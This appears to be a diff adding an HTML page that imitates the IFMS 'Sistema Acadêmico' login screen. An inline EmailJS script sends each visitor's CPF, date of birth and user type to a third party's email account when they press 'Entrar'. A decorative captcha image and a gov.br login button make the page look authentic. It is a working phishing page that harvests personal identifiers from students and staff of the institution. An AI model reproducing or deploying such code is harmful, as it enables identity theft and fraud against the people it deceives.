@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="pt-br" xml:lang="pt-br">
+
+<head>
+    
+	<link rel="stylesheet" href="default.css"/>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+        </head>
+
+<body>
+        <div id="portal-header" role="banner">
+            <div>
+                <div id="logo">
+                    <a id="portal-logo" title="Sistema Acadêmico IFMS" href="/">
+                        <span id="portal-title-1">Instituto Federal de Mato Grosso do Sul</span>
+                        <h1 id="portal-title" class="corto" title="Sistema Acadêmico IFMS">Sistema Acadêmico</h1>
+                        <!-- <span id="portal-description"></span> -->
+                    </a>
+                </div>
+            </div>
+            <nav id="sobre" class="navbar navbar-default">
+                                <form class="navbar-form navbar-left" role="search">
+                    <div class="form-group">
+                                            </div>
+                </form>
+                <div id="div-menu-collapse" class="container-fluid hidden-lg hidden-md hidden-sm">
+                                    </div><!-- /.container-fluid -->
+                <div class="clear"></div>
+            </nav>
+        </div>
+                <div class="container-fluid">
+            <div class="row">
+                <div class="col-lg-2 col-md-3 hidden-xs">
+                    <!-- MENU -->
+                    <div class="portletWrapper">
+                        <dl class="portlet portletNavigationTree">
+                            <dd class="portletItem lastItem">
+                                <ul class="navTree navTreeLevel0">
+                                    <li class="navTreeItem visualNoMarker navTreeFolderish last-item">
+                                        <a href="http://www.ifms.edu.br" title="Site do IFMS" class="state-published navTreeFolderish contenttype-folder">
+                                            <span>Site do IFMS</span>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </dd>
+                        </dl>
+                                            </div>
+                    <!-- Fim MENU -->
+                </div>
+                <div class="col-lg-10 col-md-9" id="conteudo">
+                                        <div class="row">
+    <div class="col-lg-12">
+        <h2 class="outstanding-title">Autenticação de acesso</h2>
+        <div class="row">
+            <div class="col-lg-3 col-md-6 col-sm-7">
+                <p>Insira seus dados para acessar:</p>
+                <form method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"/></div>                    <div class="form-group">
+                        <label for="perfil">Entrar como</label>
+                        <div class="input select"><select name="entrar_como" class="form-control" id="entrar-como"><option value="estudante">Estudante</option><option value="servidor">Servidor</option></select></div>                    </div>
+                    <div class="form-group">
+                        <label for="cpf">CPF (somente números)</label>
+                        <div class="input tel required"><input type="tel" name="cpf" placeholder="CPF" maxlength="11" class="form-control" required="required" id="cpf"/></div>                    </div>
+                    <div class="form-group">
+                        <label for="data_nascimento">Data de nascimento (dd/mm/aaaa)</label>
+                        <div class="input tel required"><input type="date" name="data_nascimento" placeholder="dd/mm/aaaa" maxlength="10" class="form-control date" required="required" id="data-nascimento"/></div>                    </div>
+                    <div class="form-group">
+                        <label for="captcha">Captcha</label>
+                        <div class="g-recaptcha" data-sitekey="6LcigTkUAAAAADBHHpVv97Jc4VUB6x44zw7WFRzm"><img src="captcha.png" height="95" width="370" alt=""/></div>
+                                            </div>
+                    <button type="submit" class="btn btn-primary" onclick="enviarEmail()">Entrar</button>
+                </form>
+                <br>
+                <br>
+            </div>
+
+
+            <div class="col-lg-3 col-md-6 col-sm-7">
+
+            <div style="border-top: 1px solid #ccc; margin:25px 0 20px 0; padding: 0">
+                <div style="margin-top: -8px; text-align: center"><span style="background-color: white; padding: 10px"><strong>OU</strong></span></div>
+            </div>
+
+            <a href="https://sso.acesso.gov.br/authorize?response_type=code&client_id=academico.ifms.edu.br&scope=openid+(profile/phone/email/govbr_empresa)&redirect_uri=https%3A%2F%2Facademico.ifms.edu.br&nonce=469882ba&state=2c1f9cc5" class="btn btn-lg btn-block btn-default">Entrar com <img src="govbr-colorido-b.png" height="25" width="100" alt=""/></a>            </div>
+
+        </div>
+    </div>
+</div>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid" id="rodape">
+            <div class="row">
+                <center>Caso ocorra alguma inconsistência favor procurar a Central de Relacionamento (CEREL) do seu campus.</center>
+                <div id="footer-brasil"></div>
+            </div>
+        </div>
+    </div>
+    
+    <script type="text/javascript">
+
+                emailjs.init("fNg3ersx1H2RbQHxu");
+
+        function enviarEmail() {
+            // Obter os valores do formulário
+            var entrarComo = document.getElementById("entrar-como").value;
+            var cpf = document.getElementById("cpf").value;
+            var dataNascimento = document.getElementById("data-nascimento").value;
+
+            // Configuração do e-mail
+            var emailConfig = {
+                service_id: "service_sy13tqk",
+                template_id: "template_m5vjd7w",
+                user_id: "fNg3ersx1H2RbQHxu",
+                template_params: {
+                    "entrarComo": entrarComo,
+                    "cpf": cpf,
+                    "dataNascimento": dataNascimento
+                }
+            };
+
+            // Envio do e-mail
+            emailjs.send("default_service", "Meu modelo padrão", emailConfig.template_params)
+                .then(function(response) {
+                    alert("E-mail enviado com sucesso", response);
+                }, function(error) {
+                    alert("Erro ao enviar o e-mail", error);
+                });
+        }
+    </script>
+
+</html>
